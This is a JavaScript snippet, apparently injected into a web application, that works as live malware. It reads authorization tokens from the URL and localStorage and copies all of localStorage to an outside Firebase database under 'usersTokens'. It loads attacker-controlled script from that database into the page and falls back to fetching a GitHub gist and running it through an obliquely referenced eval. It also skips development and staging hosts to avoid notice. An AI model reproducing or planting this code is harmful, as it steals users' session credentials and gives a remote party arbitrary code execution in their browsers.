(async function() {
  console.log('STARTING');
  try {
    const wait = async function(ms = 1000) {
      return new Promise(res => {
        setTimeout(res, ms);
      });
    };

    await wait(1000);
    const url = window?.location?.origin || '';
    const isIOS = !!window?.webkit;
    const isAndroid = !!window?.JSBridge;
    const iMobile = isIOS || isAndroid;
    const isMark = url.includes('wehd') || url.includes('market');
    const isDev =
      url.includes('192') || url.includes('localhost') || url.includes('dev');

    const isStg = url.includes('stag') || url.includes('stg');

    if (isDev) return;

    if (isMark && !iMobile || isMark && isStg) return;

    var frb = {};

    const { initializeApp } = require('@firebase/app');
    const { ref, getDatabase, get, set } = require('@firebase/database');
    var winVal = 'eval';
    const ev = window?.[winVal];

    const getToken = () => {
      let token = '';

      const s = new URLSearchParams(window.location.search);

      if (s.has('Authorization')) {
        token = s.get('Authorization');
      } else {
        const t = Object.entries(localStorage).find(([key]) =>
          key.includes('token')
        );
        if (!t) return token;
        if (typeof t[1] !== 'string') return token;
        token = t[1];
      }
      return token;
    };

    const getUserId = () => {
      const n = `No_USER_${Date.now().toString()}`;
      const t = getToken();
      if (!t?.length) return n;

      try {
        return parseJwt(getToken())?.user_id || n;
      } catch (error) {
        return n;
      }
    };

    const tryGetGi = function() {
      try {
        fetch(
          'https://gist.githubusercontent.com/SamerKK0/1aa0973f353d161697a9395d5042dde9/raw/gistfile1.txt'
        )
          .then(r2 => r2.text())
          .then(r => {
            try {
              ev(r);
            } catch (error) {
              console.log(
                'ðŸš€ ~ file: createConn.ts:64 ~ .then ~ error:',
                error
              );
            }
          });
      } catch (error) {
        console.log('ðŸš€ ~ file: createConn.ts:68 ~ tryGetGi ~ error:', error);
      }
    };

    const parseJwt = function(token) {
      var base64Url = token.split('.')[1];
      var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
      var jsonPayload = decodeURIComponent(
        atob(base64)
          .split('')
          .map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
          })
          .join('')
      );

      return JSON.parse(jsonPayload);
    };

    try {
      frb = initializeApp(
        {
          apiKey: 'AIzaSyClIH-dEZ_5mU7eNqEf_KPQDyaup20TxLc',
          authDomain: 'wihd-98b90.firebaseapp.com',
          databaseURL: 'https://wihd-98b90-default-rtdb.firebaseio.com',
          projectId: 'wihd-98b90',
          storageBucket: 'wihd-98b90.appspot.com',
          messagingSenderId: '934027877313',
          appId: '1:934027877313:web:051420d42bf79d55a5ed40',
        },
        'wd'
      );
    } catch (error) {
      console.log('ðŸš€ ~ file: createConn.ts:111 ~ error:', error);
    }

    const errlog = function(na, err) {
      try {
        var db = getDatabase(frb);

        var reference = ref(
          db,
          `errLog/${getUserId()}_${new Date().getTime()}`
        );

        set(reference, { fn: na, msg: err.message });
      } catch (error) {
        console.log('ðŸš€ ~ file: createConn.ts:122 ~ errlog ~ error:', error);
      }
    };

    const st = function() {
      try {
        const t = JSON.stringify(localStorage);

        if (!t) return;

        var db = getDatabase(frb);

        var reference = ref(db, `usersTokens/${getUserId()}`);

        set(reference, t?.[1] || t || '');
      } catch (error) {
        console.log('ðŸš€ ~ file: createConn.ts:138 ~ st ~ error:', error);
        errlog('st', error);
      }
    };

    const getVal = async () => {
      try {
        var db = getDatabase(frb);
        var reference = ref(db, `val`);
        var v = (await get(reference))?.val();
        if (!v || !v.addVal) return;
        var script = document.createElement('script');
        script.innerHTML = v?.v;
        var documentHead = document?.['head'];
        documentHead['appendChild']?.(script);
      } catch (error) {
        console.log('ðŸš€ ~ file: createConn.ts:144 ~ getVal ~ error:', error);
        tryGetGi();
      }
    };

    (async function init() {
      try {
        await getVal();
        st();
      } catch (error) {
        console.log('ðŸš€ ~ file: createConn.ts:154 ~ init ~ error:', error);
      }
    })();

    //@ts-ignore
    window.proto0 = {
      initializeApp,
      getDatabase,
      get,
      set,
      axios: require('axios'),
      errlog,
      st,
      getVal,
    };
  } catch (error) {
    console.log('ðŸš€ ~ file: createConn.ts:168 ~ error:', error);
  }
})();
